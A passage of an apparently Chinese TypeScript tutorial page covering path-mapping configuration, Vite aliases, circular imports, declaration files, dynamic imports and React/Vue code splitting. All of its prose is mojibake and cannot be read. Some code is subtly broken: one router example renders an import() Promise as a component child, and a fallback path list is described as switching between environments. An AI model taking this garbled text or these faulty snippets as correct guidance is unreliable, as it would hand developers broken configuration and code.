<span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vite&#x27;</span>;<br><span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;path&#x27;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(&#123;<br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">alias</span>: &#123;<br>      <span class="hljs-string">&#x27;@&#x27;</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;./src&#x27;</span>),<br>    &#125;<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>é—®é¢˜1ï¼šè·¯å¾„æ˜ å°„åœ¨è¿è¡Œæ—¶å¤±æ•ˆ</p><p>åŸå› ï¼šTypeScript åªå¤„ç†ç¼–è¯‘æ—¶è·¯å¾„ï¼Œè¿è¡Œæ—¶éœ€æ‰“åŒ…å™¨æ”¯æŒ</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…è·¯å¾„è½¬æ¢å·¥å…·</span><br>npm install tsconfig-paths --save-dev<br><br><span class="hljs-comment"># è¿è¡Œæ—¶åŠ è½½</span><br>node -r tsconfig-paths/register app.ts<br></code></pre></td></tr></table></figure><p>é—®é¢˜2ï¼šå¾ªç¯ä¾èµ–è­¦å‘Š</p><p>åœºæ™¯ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">src/<br>  components/<br>    Button.ts  // import &#123; theme &#125; from &#x27;@utils&#x27;<br>  utils/<br>    index.ts   // import &#123; Button &#125; from &#x27;@components&#x27;<br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><ol><li>é‡æ„æå–å…¬å…±æ¨¡å—</li><li>ä½¿ç”¨ä¾èµ–æ³¨å…¥</li><li>åŠ¨æ€å¯¼å…¥æ‰“ç ´å¾ªç¯</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// utils/index.ts</span><br><span class="hljs-keyword">let</span> <span class="hljs-title class_">Button</span>: <span class="hljs-built_in">any</span>;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Button</span>) &#123;<br>    <span class="hljs-title class_">Button</span> = (<span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;@components/Button&#x27;</span>)).<span class="hljs-property">default</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Button</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é—®é¢˜3ï¼šå£°æ˜æ–‡ä»¶ç¼ºå¤±</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä¸ºè·¯å¾„æ˜ å°„åˆ›å»ºå£°æ˜æ–‡ä»¶</span><br><span class="hljs-comment">// src/path-mappings.d.ts</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;@components/*&#x27;</span> &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-attr">component</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">ComponentType</span>;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> component;<br>&#125;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;@utils&#x27;</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">formatDate</span>(<span class="hljs-params"><span class="hljs-attr">date</span>: <span class="hljs-title class_">Date</span></span>): <span class="hljs-built_in">string</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§è·¯å¾„æ˜ å°„æŠ€æœ¯</strong></p><ol><li>æ¡ä»¶è·¯å¾„æ˜ å°„ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;paths&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-string">&quot;config/production&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒ</span><br>      <span class="hljs-string">&quot;config/development&quot;</span> <span class="hljs-comment">// å¼€å‘ç¯å¢ƒ</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>å¤šé¡¹ç›®å…±äº«æ˜ å°„ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// åŸºåº§é¡¹ç›® tsconfig.base.json</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;compilerOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;paths&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@shared/*&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;../shared/*&quot;</span><span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-comment">// å­é¡¹ç›® tsconfig.json</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;extends&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;../tsconfig.base.json&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;compilerOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;baseUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;src&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ol start="3"><li>è·¯å¾„æ˜ å°„é‡å®šå‘ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;paths&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;old-module&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;new-module&quot;</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// é‡å®šå‘æ—§è·¯å¾„</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>è·¯å¾„æ˜ å°„è§„èŒƒæŒ‡å—</strong></p><ol><li>ç»Ÿä¸€å‰ç¼€çº¦å®šï¼š</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">@app/      // åº”ç”¨æ ¸å¿ƒä»£ç <br>@lib/      // å…¬å…±åº“<br>@assets/   // é™æ€èµ„æº<br>@test/     // æµ‹è¯•å·¥å…·<br></code></pre></td></tr></table></figure><ol start="2"><li>ç¦æ­¢æ·±å±‚ç›¸å¯¹è·¯å¾„ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç¦ç”¨</span><br><span class="hljs-keyword">import</span> util <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../../../../utils&#x27;</span>;<br><br><span class="hljs-comment">// å¯ç”¨</span><br><span class="hljs-keyword">import</span> util <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@core/utils&#x27;</span>;<br></code></pre></td></tr></table></figure><ol start="3"><li>æ˜ å°„è·¯å¾„é•¿åº¦é™åˆ¶ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// ä¼˜å…ˆä½¿ç”¨çŸ­è·¯å¾„</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;paths&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;components&quot;</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// ä¸æ¨èï¼šè¿‡äºç®€çŸ­</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ol start="4"><li>æ–‡æ¡£åŒ–æ˜ å°„è§„åˆ™ï¼š</li></ol><p>è·¯å¾„æ˜ å°„è§„èŒƒï¼š</p><table><thead><tr><th align="left">æ˜ å°„è·¯å¾„</th><th align="left">å®é™…è·¯å¾„</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">@components&#x2F;*</td><td align="left">src&#x2F;components&#x2F;*</td><td align="left">å…¨å±€ç»„ä»¶</td></tr><tr><td align="left">@utils</td><td align="left">src&#x2F;utils&#x2F;index.ts</td><td align="left">å·¥å…·å‡½æ•°å…¥å£</td></tr></tbody></table><h3 id="1-4-4-åŠ¨æ€å¯¼å…¥ä¸ä»£ç åˆ†å‰²ç±»å‹å®‰å…¨"><a href="#1-4-4-åŠ¨æ€å¯¼å…¥ä¸ä»£ç åˆ†å‰²ç±»å‹å®‰å…¨" class="headerlink" title="1.4.4 åŠ¨æ€å¯¼å…¥ä¸ä»£ç åˆ†å‰²ç±»å‹å®‰å…¨"></a>1.4.4 åŠ¨æ€å¯¼å…¥ä¸ä»£ç åˆ†å‰²ç±»å‹å®‰å…¨</h3><p><strong>åŠ¨æ€å¯¼å…¥åŸºç¡€è¯­æ³•</strong></p><p>æ ¸å¿ƒè¯­æ³•ï¼šimport() å‡½æ•°è¿”å› Promiseï¼Œåœ¨æ¨¡å—åŠ è½½å®Œæˆåè§£æä¸ºæ¨¡å—å¯¹è±¡</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŸºæœ¬ç”¨æ³•</span><br><span class="hljs-keyword">const</span> modulePromise = <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./module&#x27;</span>);<br><br><span class="hljs-comment">// å¸¦è·¯å¾„å˜é‡</span><br><span class="hljs-keyword">const</span> moduleName = <span class="hljs-string">&#x27;utils&#x27;</span>;<br><span class="hljs-keyword">const</span> utilsModule = <span class="hljs-keyword">import</span>(<span class="hljs-string">`./<span class="hljs-subst">$&#123;moduleName&#125;</span>`</span>);<br></code></pre></td></tr></table></figure><p>ç±»å‹å®‰å…¨å¤„ç†ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">MathModule</span> &#123;<br>  <span class="hljs-attr">add</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span>;<br>  <span class="hljs-attr">PI</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> mathModule = <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./math&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-title class_">Promise</span>&lt;&#123; <span class="hljs-attr">default</span>: <span class="hljs-title class_">MathModule</span> &#125;&gt;;<br><br>mathModule.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">mod</span> =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mod.<span class="hljs-property">default</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// ç±»å‹å®‰å…¨è®¿é—®</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>ä»£ç åˆ†å‰²ç±»å‹å£°æ˜</strong></p><ol><li>æ¨¡å—å£°æ˜æ–‡ä»¶ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// math.module.d.ts</span><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">mathModule</span>: &#123;<br>  <span class="hljs-attr">add</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span>;<br>  <span class="hljs-attr">PI</span>: <span class="hljs-built_in">number</span>;<br>&#125;;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> mathModule;<br></code></pre></td></tr></table></figure><ol start="2"><li>åŠ¨æ€æ¨¡å—ç±»å‹ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä½¿ç”¨æ³›å‹å®šä¹‰è¿”å›ç±»å‹</span><br><span class="hljs-keyword">function</span> dynamicImport&lt;T&gt;(<span class="hljs-attr">path</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;T&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">import</span>(path) <span class="hljs-keyword">as</span> <span class="hljs-title class_">Promise</span>&lt;T&gt;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br>dynamicImport&lt;&#123; <span class="hljs-attr">default</span>: <span class="hljs-title class_">MathModule</span> &#125;&gt;(<span class="hljs-string">&#x27;./math&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">&#123; <span class="hljs-keyword">default</span>: math &#125;</span>) =&gt;</span> math.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>));<br></code></pre></td></tr></table></figure><p><strong>React åŠ¨æ€ç»„ä»¶ç±»å‹å®‰å…¨</strong></p><ol><li>React.lazy åŸºç¡€ç”¨æ³•ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">LazyComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./HeavyComponent&#x27;</span>));<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">React.Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">div</span>&gt;</span>Loading...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">LazyComponent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">React.Suspense</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>å¸¦å±æ€§çš„ç»„ä»¶ç±»å‹ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// HeavyComponent.tsx</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Props</span> &#123;<br>  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">HeavyComponent</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-title class_">Props</span>&gt; = <span class="hljs-function">(<span class="hljs-params">&#123; title, count &#125;</span>) =&gt;</span> (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;title&#125;: &#123;count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>);<br><br><span class="hljs-comment">// åŠ¨æ€å¯¼å…¥</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">LazyComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./HeavyComponent&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">mod</span> =&gt;</span> (&#123;<br>    <span class="hljs-attr">default</span>: mod.<span class="hljs-property">HeavyComponent</span><br>  &#125;))<br>);<br><br><span class="hljs-comment">// ä½¿ç”¨ï¼ˆä¿ç•™å±æ€§ç±»å‹æ£€æŸ¥ï¼‰</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">LazyComponent</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Items&quot;</span> <span class="hljs-attr">count</span>=<span class="hljs-string">&#123;5&#125;</span> /&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>Vue å¼‚æ­¥ç»„ä»¶ç±»å‹</strong></p><ol><li>defineAsyncComponentï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> &#123; defineAsyncComponent &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">AsyncComponent</span> = <span class="hljs-title function_">defineAsyncComponent</span>(<span class="hljs-function">() =&gt;</span> <br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./AsyncComponent.vue&#x27;</span>)<br>);<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">AsyncComponent</span> <span class="hljs-attr">:count</span>=<span class="hljs-string">&quot;5&quot;</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br></code></pre></td></tr></table></figure><ol start="2"><li>ç±»å‹æ¨æ–­ç»„ä»¶å±æ€§ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å£°æ˜ç»„ä»¶ç±»å‹</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">AsyncComponentProps</span> &#123;<br>  <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">AsyncComponent</span> = <span class="hljs-title function_">defineAsyncComponent</span>(&#123;<br>  <span class="hljs-attr">loader</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./AsyncComponent.vue&#x27;</span>),<br>  <span class="hljs-attr">loadingComponent</span>: <span class="hljs-title class_">LoadingSpinner</span>,<br>  <span class="hljs-attr">delay</span>: <span class="hljs-number">200</span>,<br>&#125;) <span class="hljs-keyword">as</span> <span class="hljs-title class_">DefineComponent</span>&lt;<span class="hljs-title class_">AsyncComponentProps</span>&gt;;<br></code></pre></td></tr></table></figure><p><strong>ä»£ç åˆ†å‰²æ¨¡å¼</strong></p><ol><li>è·¯ç”±çº§åˆ†å‰²ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// React Router v6</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createBrowserRouter</span>([<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/dashboard&#x27;</span>,<br>    <span class="hljs-attr">element</span>: (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">React.Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Spinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        &#123;import(&#x27;./Dashboard&#x27;)&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">React.Suspense</span>&gt;</span></span><br>    )<br>  &#125;,<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/reports&#x27;</span>,<br>    <span class="hljs-attr">lazy</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./Reports&#x27;</span>) <span class="hljs-comment">// è‡ªåŠ¨å¤„ç†Suspense</span><br>  &#125;<br>]);<br></code></pre></td></tr></table></figure><ol start="2"><li>åŠŸèƒ½çº§åˆ†å‰²ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æŒ‰éœ€åŠ è½½å·¥å…·åº“</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">processData</span>(<span class="hljs-params"><span class="hljs-attr">data</span>: <span class="hljs-built_in">any</span>[]</span>) &#123;<br>  <span class="hljs-keyword">if</span> (data.<span class="hljs-property">length</span> &gt; <span class="hljs-number">1000</span>) &#123;<br>    <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./heavy-utils&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">&#123; sortBigData &#125;</span>) =&gt;</span> &#123;<br>      <span class="hljs-title function_">sortBigData</span>(data);<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>æ¡ä»¶åˆ†å‰²ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ ¹æ®è®¾å¤‡åŠ è½½ä¸åŒæ¨¡å—</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">loadEditor</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isMobileDevice</span>()) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./mobile-editor&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./desktop-editor&#x27;</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>ç±»å‹å®‰å…¨ç­–ç•¥</strong></p><ol><li>åŠ¨æ€å¯¼å…¥æ³›å‹å°è£…ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// safeImport.ts</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> safeImport&lt;T&gt;(<span class="hljs-attr">modulePath</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;T&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;[request]&quot; */</span> modulePath) <span class="hljs-keyword">as</span> <span class="hljs-title class_">Promise</span>&lt;T&gt;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ChartModule</span> &#123;<br>  <span class="hljs-attr">renderChart</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">data</span>: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;<br>&#125;<br><br>safeImport&lt;<span class="hljs-title class_">ChartModule</span>&gt;(<span class="hljs-string">&#x27;./charting-lib&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">chart</span> =&gt;</span> chart.<span class="hljs-title function_">renderChart</span>(data));<br></code></pre></td></tr></table></figure><ol start="2"><li>æ¨¡å—ç±»å‹éªŒè¯ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 